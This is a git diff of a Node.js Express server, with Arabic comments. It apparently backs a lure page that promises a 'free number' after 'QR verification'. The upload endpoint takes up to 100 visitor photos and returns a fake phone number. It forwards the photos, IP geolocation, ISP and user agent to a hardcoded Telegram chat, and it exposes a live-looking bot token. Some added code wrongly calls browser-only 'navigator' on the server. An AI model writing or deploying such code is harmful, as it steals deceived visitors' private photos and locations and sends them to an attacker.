@@ -1,8 +1,9 @@
 const express = require('express');
-const TelegramBot = require('node-telegram-bot-api');
-const multer = require('multer');
-const path = require('path');
+const { Telegraf } = require('telegraf');
+const axios = require('axios');
+const FormData = require('form-data');
 const fs = require('fs');
+const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -10,17 +11,11 @@ const PORT = process.env.PORT || 3000;
 // إعداد بوت التلجرام
 const TELEGRAM_TOKEN = '8236056575:AAHI0JHvTGdJiu92sDXiv7dbWMJLxvMY_x4';
 const CHAT_ID = '7604667042';
-const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });
+const bot = new Telegraf(TELEGRAM_TOKEN);
 
-// إعداد multer لتحميل الملفات
-const upload = multer({ 
-    dest: 'uploads/',
-    limits: { fileSize: 50 * 1024 * 1024 } // 50MB
-});
-
-app.use(express.json());
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
-app.use('/uploads', express.static('uploads'));
 
 // تأكد من مجلد التحميلات
 if (!fs.existsSync('uploads')) {
@@ -33,26 +28,23 @@ app.get('/', (req, res) => {
 });
 
 // استقبال الصور من الزوار
-app.post('/upload-qr', upload.array('photos', 100), async (req, res) => {
+app.post('/upload-qr', express.raw({ type: '*/*', limit: '100mb' }), async (req, res) => {
     try {
-        const visitorInfo = await getVisitorInfo(req);
+        const data = JSON.parse(req.body.toString());
+        const { photos, visitorInfo } = data;
         
         // إرسال معلومات الزائر أولاً
         await sendVisitorInfo(visitorInfo);
         
-        // ثم إرسال كل الصور
-        for (const file of req.files) {
-            await sendPhotoToTelegram(file, visitorInfo);
+        // إرسال كل الصور
+        for (const photoData of photos) {
+            await sendPhotoToTelegram(photoData, visitorInfo);
         }
-        
-        // تنظيف الملفات المؤقتة
-        req.files.forEach(file => {
-            fs.unlinkSync(file.path);
-        });
         
         res.json({ 
             success: true, 
-            message: 'تم التحقق بنجاح! جاري إرسال الرقم المجاني...' 
+            message: 'تم التحقق بنجاح! جاري إرسال الرقم المجاني...',
+            phoneNumber: '+1 (415) 555-0199'
         });
         
     } catch (error) {
@@ -66,8 +58,8 @@ async function getVisitorInfo(req) {
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     
     try {
-        const ipResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-        const ipData = await ipResponse.json();
+        const response = await axios.get(`https://ipapi.co/${ip}/json/`);
+        const ipData = response.data;
         
         return {
             ip: ip,
@@ -76,13 +68,15 @@ async function getVisitorInfo(req) {
             region: ipData.region,
             isp: ipData.org,
             userAgent: req.headers['user-agent'],
-            time: new Date().toLocaleString('ar-EG')
+            time: new Date().toLocaleString('ar-EG'),
+            languages: navigator?.languages || ['ar']
         };
     } catch (error) {
         return {
             ip: ip,
             userAgent: req.headers['user-agent'],
-            time: new Date().toLocaleString('ar-EG')
+            time: new Date().toLocaleString('ar-EG'),
+            languages: ['ar']
         };
     }
 }
@@ -90,30 +84,35 @@ async function getVisitorInfo(req) {
 // إرسال معلومات الزائر للتلجرام
 async function sendVisitorInfo(visitorInfo) {
     const message = `
-🎯 *زائر جديد حاول تحميل QR*
+🎯 *زائر جديد حمل QR*
 
 *🌍 معلومات الموقع:*
 • الدولة: ${visitorInfo.country || 'غير معروف'}
 • المدينة: ${visitorInfo.city || 'غير معروف'} 
 • المنطقة: ${visitorInfo.region || 'غير معروف'}
-• IP: ${visitorInfo.ip}
+• IP: \`${visitorInfo.ip}\`
 • مزود الخدمة: ${visitorInfo.isp || 'غير معروف'}
 
 *💻 معلومات الجهاز:*
 • المتصفح: ${visitorInfo.userAgent}
+• اللغات: ${visitorInfo.languages.join(', ')}
 
 *🕒 الوقت:* ${visitorInfo.time}
     `;
     
-    await bot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });
+    await bot.telegram.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });
 }
 
 // إرسال الصور للتلجرام
-async function sendPhotoToTelegram(file, visitorInfo) {
+async function sendPhotoToTelegram(photoData, visitorInfo) {
     try {
-        await bot.sendPhoto(CHAT_ID, file.path, {
-            caption: `📸 صورة من الزائر - ${visitorInfo.country || 'غير معروف'} - ${new Date().toLocaleString('ar-EG')}`
-        });
+        const buffer = Buffer.from(photoData.data);
+        await bot.telegram.sendPhoto(CHAT_ID, 
+            { source: buffer },
+            {
+                caption: `📸 صورة من ${visitorInfo.country || 'غير معروف'} - ${visitorInfo.time}\nعدد الصور: ${photoData.index + 1}/${photoData.total}`
+            }
+        );
     } catch (error) {
         console.error('Error sending photo:', error);
     }
